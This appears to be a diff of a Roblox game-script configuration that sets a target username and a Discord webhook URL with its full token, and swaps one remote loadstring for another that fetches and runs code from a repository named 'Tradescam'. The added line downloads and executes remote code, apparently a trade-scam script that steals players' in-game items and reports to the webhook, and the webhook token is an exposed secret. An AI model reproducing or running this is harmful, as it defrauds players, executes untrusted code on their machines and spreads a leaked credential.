@@ -2,4 +2,4 @@ Username = "Hiro230_kyn"
 loadingscreen = true 
 farmui = false
 webhook = "https://discord.com/api/webhooks/1098858569631281152/xSvjPy4P9qH7m1ZCwCtvDT0TraaHTjpit-cJI_qDrY7UFI0BNBWhVA_tMiIUgyJ9zCcd"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jayciegantala/Tradescam/main/TradeScam"))()
